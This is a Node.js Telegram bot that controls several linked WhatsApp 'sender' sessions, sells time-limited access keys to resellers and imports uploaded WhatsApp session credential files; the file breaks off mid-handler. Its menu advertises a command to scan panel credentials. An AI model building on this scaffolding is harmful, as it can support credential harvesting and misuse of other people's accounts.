const { Telegraf } = require("telegraf");
const fs = require("fs");
const pino = require("pino");
const chalk = require("chalk");
const path = require("path");
const config = require("./Database/config.js");
const axios = require("axios");
const express = require("express");
const os = require("os");
const AdmZip = require("adm-zip");
const tar = require("tar");
const bodyParser = require("body-parser");
const cookieParser = require("cookie-parser");
const cors = require("cors");
const crypto = require("crypto");
let Boom;
try { Boom = require("@hapi/boom").Boom; } catch { Boom = null; }

const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  makeCacheableSignalKeyStore,
  makeInMemoryStore,
  generateWAMessageFromContent,
  fetchLatestWAWebVersion,
  Browsers,
} = require("@whiskeysockets/baileys");

const {
  tokens,
  owner: OwnerId,
  port: PORT,
  bannerTelegram:  BANNER_TELEGRAM = "https://files.catbox.moe/kei4t3.jpg",
} = config;

const getBannerDataURI = (filePath, mime) => {
  try {
    const buf = fs.readFileSync(path.join(__dirname, filePath));
    return `data:${mime};base64,${buf.toString("base64")}`;
  } catch (e) {
    console.error(`[!] Could not load local image: ${filePath} —`, e.message);
    return "";
  }
};

const bot = new Telegraf(tokens);
const app = express();
app.use(cors());

const BOT_NAME    = "CIPHER BVG";
const BOT_VERSION = "7.0.0";
const CREATOR     = "S7xShamrez";

const ownerIds     = OwnerId ? [String(OwnerId).trim()] : [];
const sessions     = new Map();
const FILE_SESSION = "./sessions.json";
const SESSIONS_DIR = "./auth";
const FILE_AKSES   = "./Database/akses.json";
const FILE_USERS   = path.join(__dirname, "./Database/user.json");

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

let _aksesCache = null;

function loadAkses() {
  if (_aksesCache) return _aksesCache;
  let data;
  try {
    data = fs.existsSync(FILE_AKSES)
      ? JSON.parse(fs.readFileSync(FILE_AKSES, "utf8"))
      : {};
  } catch {
    data = {};
  }
  if (!Array.isArray(data.owners))     data.owners     = [];
  if (!Array.isArray(data.akses))      data.akses      = [];
  if (!Array.isArray(data.resellers))  data.resellers  = [];
  if (!Array.isArray(data.pts))        data.pts        = [];
  if (!Array.isArray(data.moderators)) data.moderators = [];
  if (!Array.isArray(data.pairOnly))   data.pairOnly   = [];

  ownerIds.map(String).forEach(id => {
    if (id && !data.owners.includes(id)) {
      data.owners.push(id);
      fs.writeFileSync(FILE_AKSES, JSON.stringify(data, null, 2));
    }
  });
  _aksesCache = data;
  return data;
}

function saveAkses(data) {
  fs.writeFileSync(FILE_AKSES, JSON.stringify(data, null, 2));
  _aksesCache = data;
}

const isOwner      = id => loadAkses().owners.includes(id.toString());
const isReseller   = id => loadAkses().resellers.includes(id.toString());
const isPT         = id => loadAkses().pts.includes(id.toString());
const isModerator  = id => loadAkses().moderators.includes(id.toString());
const isPairOnly   = id => loadAkses().pairOnly.includes(id.toString());
const isAuthorized = id => {
  const d = loadAkses();
  return (
    d.owners.includes(id.toString())    ||
    d.akses.includes(id.toString())     ||
    d.resellers.includes(id.toString()) ||
    d.pts.includes(id.toString())       ||
    d.moderators.includes(id.toString())
  );
};

function saveUsers(users) {
  try {
    fs.writeFileSync(FILE_USERS, JSON.stringify(users, null, 2), "utf-8");
  } catch (err) {
    console.error("[x] Failed to save users:", err);
  }
}

function getUsers() {
  if (!fs.existsSync(FILE_USERS)) return [];
  try { return JSON.parse(fs.readFileSync(FILE_USERS, "utf-8")); }
  catch { return []; }
}

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const v = parseInt(match[1]);
  return match[2] === "d" ? v * 86400000 : v * 3600000;
}

function makeBox(title, lines) {
  const maxLen = Math.max(title.length, ...lines.map(l => l.length));
  const top    = "╔" + "═".repeat(maxLen + 2) + "╗";
  const mid    = "╠" + "═".repeat(maxLen + 2) + "╣";
  const bot    = "╚" + "═".repeat(maxLen + 2) + "╝";
  const center = (t, w) => { const p = w - t.length; return " ".repeat(Math.floor(p/2)) + t + " ".repeat(p - Math.floor(p/2)); };
  const rpad   = (t, w) => t + " ".repeat(w - t.length);
  return `<blockquote>\n${top}\n║ ${center(title, maxLen)} ║\n${mid}\n${lines.map(l => "║ " + rpad(l, maxLen) + " ║").join("\n")}\n${bot}\n</blockquote>`;
}

const makeStatus = (number, status) => makeBox("STATUS", [
  `Number : ${number}`,
  `Status : ${status.toUpperCase()}`
]);

const makeCode = (number, code) => ({
  text: makeBox("PAIR CODE", [
    `Number : ${number}`,
    `Code   : ${code}`
  ]),
  parse_mode: "HTML"
});

const saveActive = (num) => {
  try {
    const list = fs.existsSync(FILE_SESSION) ? JSON.parse(fs.readFileSync(FILE_SESSION)) : [];
    if (!list.includes(num)) fs.writeFileSync(FILE_SESSION, JSON.stringify([...list, num]));
  } catch (err) {
    console.error(`[x] saveActive(${num}): ${err.message}`);
  }
};

const delActive = (num) => {
  try {
    if (!fs.existsSync(FILE_SESSION)) return;
    const list = JSON.parse(fs.readFileSync(FILE_SESSION));
    fs.writeFileSync(FILE_SESSION, JSON.stringify(list.filter(n => n !== num)));
  } catch (err) {
    console.error(`[x] delActive(${num}): ${err.message}`);
  }
};

const sessionPath = (num) => {
  const dir = path.join(SESSIONS_DIR, `device${num}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const reconnectTimers  = new Map();
const pendingCodes     = new Map();
const pendingSessions  = new Map();

const tg = async (text) => {
  try { await bot.telegram.sendMessage(OwnerId, text, { parse_mode: "HTML" }); } catch {}
};

const wipeDir = (BotNumber) => {
  try {
    const sd = path.join(SESSIONS_DIR, `device${BotNumber}`);
    if (fs.existsSync(sd)) fs.rmSync(sd, { recursive: true, force: true });
  } catch {}
};

const createWAConnection = async (BotNumber, ctx = null, statusMsg = null) => {
  const sessDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessDir);

  const sessionStore = makeInMemoryStore({ logger: pino({ level: "silent" }) });

  let waVersion;
  try {
    const { version } = await fetchLatestWAWebVersion();
    waVersion = version;
  } catch {
    waVersion = [2, 3000, 1043890899];
  }

  const sock = makeWASocket({
    version:                        waVersion,
    logger:                         pino({ level: "silent" }),
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore
        ? makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" }))
        : state.keys
    },
    browser:                        Browsers ? Browsers.ubuntu("Chrome") : ["Ubuntu", "Chrome", ""],
    markOnlineOnConnect:            true,
    emitOwnEvents:                  true,
    ignoreOfflineMessages:          false,
    syncFullHistory:                false,
    generateHighQualityLinkPreview: false,
    keepAliveIntervalMs:            25000,
    connectTimeoutMs:               60000,
    retryRequestDelayMs:            2000,
    cachedGroupMetadata:            async () => undefined,
    shouldIgnoreJid:                jid => jid && jid.includes("@newsletter"),
    shouldSyncHistoryMessage:       msg => !!msg.syncType,
    getMessage: async (key) => {
      const msg = await sessionStore.loadMessage(key.remoteJid, key.id);
      return msg && (msg.message || msg) || { conversation: "hello" };
    },
    patchMessageBeforeSending: (msg) => {
      const im = msg && (msg.interactiveMessage
        || (msg.message && msg.message.interactiveMessage)
        || (Object.values(msg).find(v => v && v.message && v.message.interactiveMessage) || {}).message && (Object.values(msg).find(v => v && v.message && v.message.interactiveMessage)).message.interactiveMessage);
      const c = !!(im && im.carouselMessage && im.carouselMessage.cards && im.carouselMessage.cards.every(i => i && i.nativeFlowMessage && i.nativeFlowMessage.buttons));
      if (im && (im.nativeFlowMessage && im.nativeFlowMessage.buttons || c)) {
        const obj    = { name: "cta_url", buttonParamsJson: "" };
        const ctaify = but => Array.isArray(but)
          ? but.flatMap(b => !b || !b.buttonParamsJson ? [] : b.name && b.name.toLowerCase && b.name.toLowerCase().includes("cta_url") ? [b] : [obj, b])
          : but;
        if (im.nativeFlowMessage && im.nativeFlowMessage.buttons) im.nativeFlowMessage.buttons = ctaify(im.nativeFlowMessage.buttons);
        if (c) im.carouselMessage.cards.forEach(card => { if (Array.isArray(card.nativeFlowMessage && card.nativeFlowMessage.buttons)) card.nativeFlowMessage.buttons = ctaify(card.nativeFlowMessage.buttons); });
      }
      const requiresVO = !!(msg.buttonsMessage || msg.templateMessage || msg.listMessage);
      if (requiresVO) msg = { viewOnceMessage: { message: Object.assign({}, msg) } };
      const p = m => {
        const r = (m.botForwardedMessage && m.botForwardedMessage.message && m.botForwardedMessage.message.richResponseMessage) || m.richResponseMessage;
        if (!r) return m;
        r.contextInfo = Object.assign({}, r.contextInfo, { isForwarded: true, forwardOrigin: 4 });
        return m.botForwardedMessage ? m : { botForwardedMessage: { message: m } };
      };
      if (msg.deviceSentMessage && msg.deviceSentMessage.message) msg.deviceSentMessage.message = p(msg.deviceSentMessage.message);
      else msg = p(msg);
      return msg;
    },
  }, sessionStore);

  let wasLinked = false;
  let pairCodeSent = false;
  const editStatus = async (text) => {
    if (!ctx || !statusMsg) return;
    try {
      await ctx.telegram.editMessageText(
        statusMsg.chat.id, statusMsg.message_id, null,
        text, { parse_mode: "HTML" }
      );
    } catch {}
  };

  sessionStore.bind(sock.ev);
  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {

    // 'connecting' means the noise handshake completed — WA channel is ready.
    // This is the correct moment to call requestPairingCode.
    // Not before (WS not established), not on 'open' (already linked by then).
    if (connection === "connecting" && !pairCodeSent && !state.creds.registered) {
      pairCodeSent = true;
      try {
        const clean = BotNumber.replace(/[^0-9]/g, "");
        const raw  = await sock.requestPairingCode(clean);
        const code = (raw && raw.match && raw.match(/.{1,4}/g) && raw.match(/.{1,4}/g).join("-")) || raw;
        console.log(chalk.green("[+] [" + BotNumber + "] Code: " + code));

        if (pendingCodes.has(BotNumber)) {
          pendingCodes.get(BotNumber).resolve(code);
          pendingCodes.delete(BotNumber);
        }

        if (ctx) {
          const msg = makeCode(BotNumber, code);
          await editStatus(msg.text);
          await tg(msg.text);
        }
      } catch (e) {
        console.error(chalk.red("[x] [" + BotNumber + "] Pairing error: " + e.message));

        if (pendingCodes.has(BotNumber)) {
          pendingCodes.get(BotNumber).reject(new Error("Pairing code request failed: " + e.message));
          pendingCodes.delete(BotNumber);
        }

        if (ctx) {
          const errText = makeStatus(BotNumber, "Pairing failed. Run /addbot again.");
          await editStatus(errText);
          await tg(errText);
        }
      }
    }

    if (connection === "open") {
      wasLinked = true;
      if (reconnectTimers.has(BotNumber)) {
        clearTimeout(reconnectTimers.get(BotNumber));
        reconnectTimers.delete(BotNumber);
      }
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      console.log(chalk.green("[+] [" + BotNumber + "] Connected"));

      try { await sock.sendPresenceUpdate("available"); } catch (_) {}

      if (pendingSessions.has(BotNumber)) {
        pendingSessions.get(BotNumber)(true);
        pendingSessions.delete(BotNumber);
      }

      if (pairCodeSent) {
        // Code already sent — don't spam a Connected message on top of pairing flow
        return;
      }

      const connText = makeStatus(BotNumber, "Connected and ready.");
      await editStatus(connText);
      await tg(connText);

    }

    if (connection === "close") {
      let reason;
      try {
        const errObj = lastDisconnect && lastDisconnect.error;
        if (Boom && errObj) {
          const b = new Boom(errObj);
          reason = b && b.output && b.output.statusCode;
        }
        if (!reason && lastDisconnect && lastDisconnect.error) {
          reason = lastDisconnect.error.output && lastDisconnect.error.output.statusCode
            || lastDisconnect.error.statusCode
            || lastDisconnect.error.status;
        }
      } catch {
        reason = null;
      }
      if (!reason || reason === 500) {
        const msg = (lastDisconnect && lastDisconnect.error && lastDisconnect.error.message) || "";
        const isTransient = msg.toLowerCase().includes("connection closed")
          || msg.toLowerCase().includes("connection lost")
          || msg.toLowerCase().includes("timed out")
          || msg.toLowerCase().includes("stream ended")
          || msg === ""; // WA post-pairing close has no message — treat as transient
        // Unknown/null reason always reconnects — never silently die
        reason = isTransient ? DisconnectReason.restartRequired : (reason || DisconnectReason.restartRequired);
      }
      // Log AFTER remap so the displayed reason reflects what the reconnect logic will use
      const reasonLabel = Object.entries(DisconnectReason).find(([,v]) => v === reason)?.[0] || reason;
      console.log(chalk.yellow("[!] [" + BotNumber + "] Closed (" + reasonLabel + ")"));

      if (reason === 515) {
        if (reconnectTimers.has(BotNumber)) clearTimeout(reconnectTimers.get(BotNumber));
        reconnectTimers.set(BotNumber, setTimeout(async () => {
          reconnectTimers.delete(BotNumber);
          try { await createWAConnection(BotNumber); } catch {}
        }, 1000));
        return;
      }

      sessions.delete(BotNumber);

      if (!wasLinked && pendingSessions.has(BotNumber)) {
        pendingSessions.get(BotNumber)(false);
        pendingSessions.delete(BotNumber);
      }

      if (reason === 401 && !wasLinked) {
        console.log(chalk.red("[!] [" + BotNumber + "] 401 during pairing — wiping session."));
        delActive(BotNumber);
        wipeDir(BotNumber);
        const errText = makeStatus(BotNumber, "Pairing rejected (401). Delete session and run /addbot again.");
        await editStatus(errText);
        await tg(errText);
        return;
      }

      if (reason === DisconnectReason.loggedOut || reason === 401) {
        delActive(BotNumber);
        wipeDir(BotNumber);
        await tg(makeStatus(BotNumber, "Logged out. Re-add with /addbot."));
        return;
      }

      if (reason === DisconnectReason.badSession) {
        delActive(BotNumber);
        wipeDir(BotNumber);
        // badSession = WA is rejecting server-side. Wiped local keys.
        // Wait 15 minutes before allowing retry — hammering makes the ban longer.
        console.log(chalk.red("[!] [" + BotNumber + "] Bad session — WA rejected pairing. Waiting 15min before retry."));
        const errText = makeStatus(BotNumber, "WhatsApp rejected the session. Wait 15 minutes then run /addbot again.");
        if (ctx) await editStatus(errText).catch(() => {});
        await tg(errText).catch(() => {});
        if (reconnectTimers.has(BotNumber)) clearTimeout(reconnectTimers.get(BotNumber));
        reconnectTimers.set(BotNumber, setTimeout(async () => {
          reconnectTimers.delete(BotNumber);
          try { await createWAConnection(BotNumber, ctx, statusMsg); } catch {}
        }, 15 * 60 * 1000));
        return;
      }

      if (reason === DisconnectReason.connectionReplaced) return;

      const shouldReconnect =
        reason === DisconnectReason.connectionClosed ||
        reason === DisconnectReason.connectionLost   ||
        reason === DisconnectReason.restartRequired  ||
        reason === DisconnectReason.timedOut;

      const delay = shouldReconnect ? 3000 : 5000;
      if (reconnectTimers.has(BotNumber)) clearTimeout(reconnectTimers.get(BotNumber));
      reconnectTimers.set(BotNumber, setTimeout(async () => {
        reconnectTimers.delete(BotNumber);
        try { await createWAConnection(BotNumber); } catch {}
      }, delay));
    }
  });

};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(FILE_SESSION)) return;
  let nums;
  try { nums = JSON.parse(fs.readFileSync(FILE_SESSION, "utf8")); } catch { return; }
  if (!Array.isArray(nums) || !nums.length) return;
  for (const num of nums) {
    try { await createWAConnection(num); } catch (e) { console.error(chalk.red(`[x] Restore ${num}: ${e.message}`)); }
    await sleep(2000);
  }
};

const connectToWhatsApp = async (BotNumber, ctx) => {
  const clean = BotNumber.replace(/[^0-9]/g, "");
  if (!clean || clean.length < 7 || clean.length > 15)
    return ctx.reply("[x] Invalid number. Use international format: 234xxxxxxxxxx");
  if (sessions.has(clean))
    return ctx.reply(`[!] ${clean} already connected. Use /delbot first.`);

  delActive(clean);
  wipeDir(clean);

  const statusMsg = await ctx.reply(`⏳ Connecting <code>${clean}</code>...`, { parse_mode: "HTML" });
  try { await createWAConnection(clean, ctx, statusMsg); }
  catch (e) { await tg(makeStatus(clean, `Error: ${e.message}`)); }
};

bot.command("start", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "User";
  const teks = `<b>${BOT_NAME}</b>\nA Telegram-connected WhatsApp tool built by <b>${CREATOR}</b>.\n\n<blockquote><b>[ User Info ]</b></blockquote>\n> Creator : ${CREATOR}\n> Version : ${BOT_VERSION}\n> Username : ${username}\n\n<blockquote><b>[ Bot Management ]</b></blockquote>\n│ /addbot — Add WhatsApp sender\n│ /listbot — List active senders\n│ /delbot — Remove sender\n│ /delsesi — Delete session\n│ /addsender — Upload session file\n│ /adp — Scan panel creds\n|_____________\n<blockquote><b>[ Key Management ]</b></blockquote>\n│ /ckey — Create user key (username,30d,,Role)\n│ /mykeys — View your created keys\n│ /listkey — List ALL keys [owner only]\n│ /delkey — Delete a key\n|_____________\n<blockquote><b>[ Access Management ]</b></blockquote>\n│ /addacces &lt;id&gt; [pair]  — full or pair-only [owner]
│ /delacces  [owner]\n│ /addreseller / /delreseller  [owner/pt/mod]\n│ /addpt / /delpt  [owner/mod]\n│ /addmod / /delmod  [owner]\n│ /addowner / /delowner  [owner]\n|_____________`;
  await ctx.replyWithPhoto(
    { url: BANNER_TELEGRAM },
    { caption: teks, parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "Channel", url: "https://t.me/" }]] } }
  );
});

function makeRoleCommand(addCmd, delCmd, roleName, checkFn) {
  bot.command(addCmd, (ctx) => {
    const userId = ctx.from.id.toString();
    const id     = ctx.message.text.split(" ")[1];
    if (!checkFn(userId)) return ctx.reply("[!] Access denied.");
    if (!id) return ctx.reply(`Usage: /${addCmd} <id>`);
    const data = loadAkses();
    if (data[roleName].includes(id)) return ctx.reply(`[x] Already a ${roleName}.`);
    data[roleName].push(id);
    saveAkses(data);
    ctx.reply(`[+] Added ${id} as ${roleName}.`);
  });
  bot.command(delCmd, (ctx) => {
    const userId = ctx.from.id.toString();
    const id     = ctx.message.text.split(" ")[1];
    if (!checkFn(userId)) return ctx.reply("[!] Access denied.");
    if (!id) return ctx.reply(`Usage: /${delCmd} <id>`);
    const data = loadAkses();
    data[roleName] = data[roleName].filter(u => u !== id);
    saveAkses(data);
    ctx.reply(`[+] Removed ${id} from ${roleName}.`);
  });
}

makeRoleCommand("addreseller", "delreseller", "resellers",  id => isOwner(id) || isPT(id) || isModerator(id));
makeRoleCommand("addpt",       "delpt",       "pts",        id => isOwner(id) || isModerator(id));
makeRoleCommand("addmod",      "delmod",      "moderators", id => isOwner(id));

bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const parts  = ctx.message.text.trim().split(/\s+/);
  const id     = parts[1];
  const flag   = (parts[2] || "").toLowerCase();

  if (!isOwner(userId)) return ctx.reply("[!] Access denied.");
  if (!id) return ctx.reply(
    "Usage:\n" +
    "  /addacces <id>       — full access\n" +
    "  /addacces <id> pair  — pairing only (can use /addbot, nothing else)"
  );

  const data = loadAkses();

  if (flag === "pair") {
    if (data.akses.includes(id)) {
      data.akses = data.akses.filter(u => u !== id);
    }
    if (data.pairOnly.includes(id)) return ctx.reply("[x] Already has pair-only access.");
    data.pairOnly.push(id);
    saveAkses(data);
    return ctx.reply(
      `[+] Pair-only access granted to: <code>${id}</code>\n` +
      `They can use /addbot to pair a number, nothing else.`,
      { parse_mode: "HTML" }
    );
  }

  if (data.pairOnly.includes(id)) {
    data.pairOnly = data.pairOnly.filter(u => u !== id);
  }
  if (data.akses.includes(id)) return ctx.reply("[x] Already has full access.");
  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`[+] Full access granted to: <code>${id}</code>`, { parse_mode: "HTML" });
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id     = ctx.message.text.trim().split(/\s+/)[1];
  if (!isOwner(userId)) return ctx.reply("[!] Access denied.");
  if (!id) return ctx.reply("Usage: /delacces <id>");
  const data = loadAkses();
  const inFull = data.akses.includes(id);
  const inPair = data.pairOnly.includes(id);
  if (!inFull && !inPair) return ctx.reply("[x] ID not found in any access list.");
  if (inFull) data.akses      = data.akses.filter(u => u !== id);
  if (inPair) data.pairOnly   = data.pairOnly.filter(u => u !== id);
  saveAkses(data);
  ctx.reply(`[+] Access removed from: <code>${id}</code>`, { parse_mode: "HTML" });
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id     = ctx.message.text.split(" ")[1];
  if (!isOwner(userId)) return ctx.reply("[!] Access denied.");
  if (!id) return ctx.reply("Usage: /addowner <id>");
  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("[x] Already an owner.");
  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`[+] Owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id     = ctx.message.text.split(" ")[1];
  if (!isOwner(userId)) return ctx.reply("[!] Access denied.");
  if (!id) return ctx.reply("Usage: /delowner <id>");
  const data = loadAkses();
  data.owners = data.owners.filter(u => u !== id);
  saveAkses(data);
  ctx.reply(`[+] Owner removed: ${id}`);
});

bot.command("addbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId) && !isAuthorized(userId) && !isPairOnly(userId))
    return ctx.reply("[!] Access denied.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Usage: /addbot 234xxxxxxxxxx");
  await connectToWhatsApp(args[1], ctx);
});

bot.command("listbot", (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("[!] Access denied.");
  if (sessions.size === 0) return ctx.reply("No active senders.");
  ctx.reply(`Active Senders:\n${[...sessions.keys()].map(n => `- ${n}`).join("\n")}`);
});

bot.command("delbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args   = ctx.message.text.split(" ");
  if (!isOwner(userId)) return ctx.reply("[!] Access denied.");
  if (args.length < 2) return ctx.reply("Usage: /delbot 234xxxxxxxxxx");
  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender not found.");
  try {
    if (reconnectTimers.has(number)) {
      clearTimeout(reconnectTimers.get(number));
      reconnectTimers.delete(number);
    }
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionPath(number), { recursive: true, force: true });
    const data = JSON.parse(fs.readFileSync(FILE_SESSION));
    fs.writeFileSync(FILE_SESSION, JSON.stringify(data.filter(n => n !== number)));
    ctx.reply(`[+] Session for ${number} removed.`);
  } catch (err) {
    ctx.reply(`[x] Error removing session: ${err.message}`);
  }
});

bot.command("delsesi", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("[!] Access denied.");
  const num = ctx.message.text.split(" ").slice(1)[0];
  if (!num) return ctx.reply("Usage: /delsesi <number>");
  try {
    delActive(num);
    if (reconnectTimers.has(num)) {
      clearTimeout(reconnectTimers.get(num));
      reconnectTimers.delete(num);
    }
    if (sessions.has(num)) {
      try { sessions.get(num).end(); } catch {}
      sessions.delete(num);
    }
    const dir = path.join(SESSIONS_DIR, `device${num}`);
    if (fs.existsSync(dir)) fs.rmSync(dir, { recursive: true, force: true });
    ctx.reply(`[+] Session for ${num} deleted.`);
  } catch (err) {
    ctx.reply(`[x] Failed: ${err.message}`);
  }
});

const RESELLER_KEY_LIMIT = 10;

const VALID_ROLES = ["owner", "admin", "reseller", "moderator", "member"];

bot.command("ckey", async (ctx) => {
  const userId    = ctx.from.id.toString();
  const rawArgs   = ctx.message.text.split(" ").slice(1).join(" ").trim();
  const isOwnerU  = isOwner(userId);
  const canCreate = isOwnerU || isReseller(userId) || isPT(userId) || isModerator(userId) || isAuthorized(userId);
  if (!canCreate) return ctx.reply("[!] Access denied.");
  if (!rawArgs || !rawArgs.includes(",")) return ctx.reply(
    "Usage:\n" +
    "  /ckey username,30d\n" +
    "  /ckey username,12h,customkey\n" +
    "  /ckey username,30d,,Admin\n" +
    "  /ckey username,30d,customkey,Reseller\n\n" +
    "Roles: Owner · Admin · Reseller · Moderator · Member"
  );

  const parts      = rawArgs.split(",");
  const username   = parts[0].trim();
  const durasiStr  = parts[1] ? parts[1].trim() : "";
  const customKey  = parts[2] ? parts[2].trim() : null;
  const roleRaw    = parts[3] ? parts[3].trim() : null;
  const durationMs = parseDuration(durasiStr);
  if (!durationMs) return ctx.reply("[x] Invalid duration. Use: 7d / 1d / 12h");

  let role = "Member";
  if (roleRaw) {
    const roleLower = roleRaw.toLowerCase();
    if (!VALID_ROLES.includes(roleLower)) {
      return ctx.reply(
        `[x] Invalid role: <b>${roleRaw}</b>\nValid roles: ${VALID_ROLES.map(r => r.charAt(0).toUpperCase() + r.slice(1)).join(", ")}`,
        { parse_mode: "HTML" }
      );
    }
    if ((roleLower === "owner" || roleLower === "admin") && !isOwnerU) {
      return ctx.reply("[!] Only the owner can assign Owner or Admin roles.");
    }
    role = roleRaw.charAt(0).toUpperCase() + roleRaw.slice(1).toLowerCase();
  }

  const users = getUsers();
  if (!isOwnerU) {
    const myKeys = users.filter(u => u.createdBy === userId);
    if (myKeys.length >= RESELLER_KEY_LIMIT)
      return ctx.reply(`[x] Key limit reached (${RESELLER_KEY_LIMIT}). Delete old keys with /delkey first.`);
  }

  const key     = customKey || generateKey(4);
  const expired = Date.now() + durationMs;
  const idx     = users.findIndex(u => u.username === username);
  const entry   = { username, key, expired, role, createdBy: userId };
  if (idx !== -1) users[idx] = { ...users[idx], ...entry };
  else users.push(entry);
  saveUsers(users);

  const expStr = new Date(expired).toLocaleString("en-NG", {
    year: "numeric", month: "2-digit", day: "2-digit",
    hour: "2-digit", minute: "2-digit", timeZone: "Africa/Lagos"
  });

  const roleEmoji = { Owner: "👑", Admin: "🛡️", Reseller: "🏪", Moderator: "🔧", Member: "✅" };
  const emoji = roleEmoji[role] || "✅";

  await ctx.reply("[+] Key created. Check your DM.");
  try {
    await ctx.telegram.sendMessage(ctx.from.id,
      `[+] <b>Key Created — ${BOT_NAME}</b>\n\n` +
      `<b>Username :</b> <code>${username}</code>\n` +
      `<b>Password :</b> <code>${key}</code>\n` +
      `<b>Role     :</b> ${emoji} ${role}\n` +
      `<b>Expired  :</b> <i>${expStr} WAT</i>`,
      { parse_mode: "HTML" }
    );
  } catch {
    await ctx.reply("[!] Could not DM you. Start a private chat with me first, then retry.");
  }
});

bot.command("listkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("[!] Access denied.");
  const users = getUsers();
  if (users.length === 0) return ctx.reply("No keys created yet.");
  const now  = Date.now();
  let text   = `<b>${BOT_NAME} — All Keys</b>\n\n`;
  users.forEach((u, i) => {
    const exp    = new Date(u.expired).toLocaleString("en-NG", { year: "numeric", month: "2-digit", day: "2-digit", hour: "2-digit", minute: "2-digit", timeZone: "Africa/Lagos" });
    const status = u.expired && now > u.expired ? "EXPIRED" : "ACTIVE";
    const role = u.role || "Member";
    text += `${i + 1}. <code>${u.username}</code> [${role}] ${status}\n   Key: <code>${u.key}</code>\n   Expired: ${exp} WAT\n   By: <code>${u.createdBy || "owner"}</code>\n\n`;
  });
  ctx.reply(text, { parse_mode: "HTML" });
});

bot.command("mykeys", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId) && !isAuthorized(userId)) return ctx.reply("[!] Access denied.");
  const users  = getUsers();
  const myKeys = isOwner(userId) ? users : users.filter(u => u.createdBy === userId);
  if (myKeys.length === 0) return ctx.reply("You have no keys created.");
  const now  = Date.now();
  let text   = `<b>${BOT_NAME} — Your Keys (${myKeys.length}/${isOwner(userId) ? "unlimited" : RESELLER_KEY_LIMIT})</b>\n\n`;
  myKeys.forEach((u, i) => {
    const exp    = new Date(u.expired).toLocaleString("en-NG", { year: "numeric", month: "2-digit", day: "2-digit", hour: "2-digit", minute: "2-digit", timeZone: "Africa/Lagos" });
    const status = u.expired && now > u.expired ? "EXPIRED" : "ACTIVE";
    const role = u.role || "Member";
    text += `${i + 1}. <code>${u.username}</code> [${role}] ${status}\n   Key: <code>${u.key}</code>\n   Exp: ${exp} WAT\n\n`;
  });
  ctx.reply(text, { parse_mode: "HTML" });
});

bot.command("delkey", (ctx) => {
  const userId   = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  if (!isOwner(userId) && !isAuthorized(userId)) return ctx.reply("[!] Access denied.");
  if (!username) return ctx.reply("Usage: /delkey <username>");
  const users = getUsers();
  const idx   = users.findIndex(u => u.username === username);
  if (idx === -1) return ctx.reply(`[x] Username "${username}" not found.`);
  if (!isOwner(userId) && users[idx].createdBy !== userId) return ctx.reply("[!] You can only delete keys you created.");
  users.splice(idx, 1);
  saveUsers(users);
  ctx.reply(`[+] Key for "${username}" deleted.`);
});

bot.command("addsender", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("[!] Owner only.");

  const replyMsg = ctx.message.reply_to_message;
  if (!replyMsg?.document) return ctx.reply("[x] Reply to a session file with /addsender");

  const doc  = replyMsg.document;
  const name = doc.file_name.toLowerCase();
  if (![".json", ".zip", ".tar", ".tar.gz", ".tgz"].some(ext => name.endsWith(ext)))
    return ctx.reply("[x] Not a valid session file (.json/.zip/.tar/.tgz)");

  await ctx.reply("[..] Processing session...");

  try {
    const fileLink = await ctx.telegram.getFileLink(doc.file_id);
    const { data } = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buf = Buffer.from(data);
    const tmp = await fs.promises.mkdtemp(path.join(os.tmpdir(), "rv7sess-"));

    if (name.endsWith(".json")) {
      await fs.promises.writeFile(path.join(tmp, "creds.json"), buf);
    } else if (name.endsWith(".zip")) {
      new AdmZip(buf).extractAllTo(tmp, true);
    } else {
      const tmpTar = path.join(tmp, name);
      await fs.promises.writeFile(tmpTar, buf);
      await tar.x({ file: tmpTar, cwd: tmp });
    }

    const findCreds = async (dir) => {
      const entries = await fs.promises.readdir(dir, { withFileTypes: true });
      for (const e of entries) {
        const p = path.join(dir, e.name);
        if (e.isDirectory()) { const f = await findCreds(p); if (f) return f; }
        else if (e.name === "creds.json") return p;
      }
      return null;
    };

    const credsPath = await findCreds(tmp);
    if (!credsPath) return ctx.reply("[x] creds.json not found in session file.");

    const creds     = JSON.parse(await fs.promises.readFile(credsPath, "utf8"));
    const botNumber = creds?.me?.id ? creds.me.id.split(":")[0] : null;
    if (!botNumber) return ctx.reply("[x] Invalid creds.json (me.id missing).");

